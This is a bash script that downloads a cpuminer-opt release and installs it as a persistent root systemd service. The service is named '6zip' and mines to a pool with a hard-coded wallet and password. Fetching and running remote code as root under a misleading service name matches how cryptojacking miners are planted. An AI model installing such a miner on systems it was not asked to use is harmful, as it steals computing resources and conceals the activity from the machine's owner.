#!/bin/bash

rm -rf cpuminer

# Step 1: 
if [ ! -f "/root/cpuminer/cpuminer-sse2" ]; then
    mkdir cpuminer
    cd cpuminer
    wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-linux-5.0.41a.tar.gz -O /root/cpuminer/cpuminer-opt-linux.tar.gz
    tar -xvf /root/cpuminer/cpuminer-opt-linux.tar.gz -C /root/cpuminer
fi

# Step 2: 
sudo tee /etc/systemd/system/6zip.service <<EOF
[Unit]
Description=cpuminer-opt Service
After=network.target

[Service]
ExecStart=/root/cpuminer/cpuminer-sse2 -a hashx7  -o stratum+tcps://stratum-na.rplant.xyz:17040 -u XcUe8bp2BNSRm8wK8GE5j2fcz7KfCvBZbL.b -p webpassword=cecepabdul
WorkingDirectory=/root
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 3: 
sudo chmod 644 /etc/systemd/system/6zip.service

# Step 4:
sudo systemctl daemon-reload

# Step 5: 
sudo systemctl start 6zip.service

# Wait for 10 seconds
sleep 10

# 
journalctl -f -u 6zip.service
